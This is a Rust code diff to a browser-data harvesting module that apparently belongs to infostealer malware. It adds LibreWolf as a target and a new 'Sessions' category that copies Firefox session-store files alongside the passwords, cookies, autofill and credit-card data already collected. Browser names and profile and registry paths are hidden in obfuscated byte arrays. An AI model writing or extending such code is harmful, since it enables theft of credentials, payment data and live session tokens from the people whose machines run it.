@@ -35,6 +35,11 @@ static GECKO_BROWSERS: Lazy<Vec<(&'static str, String)>> = Lazy::new(|| {
             deobf(&[0x94, 0xD2, 0xD3, 0xD8, 0xCF, 0xDA, 0xD2, 0xDB]),
         ),
         (
+            "LibreWolf",
+            // "LibreWolf/Profiles" or "LibreWolf"
+            deobf(&[0x9B, 0xD2, 0xBF, 0xCD, 0xDA, 0x90, 0xD2, 0xDB, 0x91]),
+        ),
+        (
             "Pale Moon",
             deobf(&[
                 0x8E, 0xD2, 0xD2, 0xCF, 0xDA, 0xCB, 0xD4, 0xDB, 0xD3, 0xE1, 0x93, 0xCF, 0xD2, 0xD3,
@@ -60,6 +65,15 @@ static GECKO_INSTALL_REGISTRY: Lazy<Vec<(&'static str, Vec<String>)>> = Lazy::ne
                     0xB3, 0xB0, 0xB3, 0xA1, 0xD2, 0xDB, 0xD8, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2,
                     0xDB, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2, 0xDB, 0xA5, 0xD4, 0xCF, 0xD8, 0xCA,
                     0xCE, 0xDB,
+                ]),
+            ],
+        ),
+        (
+            "LibreWolf",
+            vec![
+                deobf(&[
+                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x9B, 0xD2, 0xBF, 0xCD,
+                    0xDA, 0x90, 0xD2, 0xDB, 0x91,
                 ]),
             ],
         ),
@@ -165,10 +179,11 @@ enum GeckoDataKind {
     Cookies,
     Autofill,
     CreditCards,
+    Sessions,
 }
 
 impl GeckoDataKind {
-    const fn all() -> [Self; 6] {
+    const fn all() -> [Self; 7] {
         [
             Self::Passwords,
             Self::History,
@@ -176,6 +191,7 @@ impl GeckoDataKind {
             Self::Cookies,
             Self::Autofill,
             Self::CreditCards,
+            Self::Sessions,
         ]
     }
 
@@ -187,6 +203,7 @@ impl GeckoDataKind {
             Self::Cookies => "Cookies",
             Self::Autofill => "Autofill",
             Self::CreditCards => "Credit Cards",
+            Self::Sessions => "Sessions",
         }
     }
 
@@ -198,6 +215,7 @@ impl GeckoDataKind {
             Self::Cookies => &["cookies.sqlite"],
             Self::Autofill => &["formhistory.sqlite"],
             Self::CreditCards => &["formhistory.sqlite"],
+            Self::Sessions => &["sessionstore.jsonlz4", "sessionstore-backups/recovery.jsonlz4"],
         }
     }
 }
@@ -212,6 +230,7 @@ fn gecko_process_name(browser: &str) -> &'static str {
         "Firefox" => "firefox.exe",
         "SeaMonkey" => "seamonkey.exe",
         "Waterfox" => "waterfox.exe",
+        "LibreWolf" => "librewolf.exe",
         "Pale Moon" => "palemoon.exe",
         _ => "firefox.exe",
     }
@@ -242,7 +261,7 @@ impl RecoveryTask for GeckoRecoveryTask {
 
                     if matches!(
                         self.kind,
-                        GeckoDataKind::Cookies | GeckoDataKind::History | GeckoDataKind::Passwords
+                        GeckoDataKind::Cookies | GeckoDataKind::History | GeckoDataKind::Passwords | GeckoDataKind::Sessions
                     ) {
                         let temp_dir = ctx.output_dir.join("browsers").join(self.profile.browser);
                         let _ = std::fs::create_dir_all(&temp_dir);
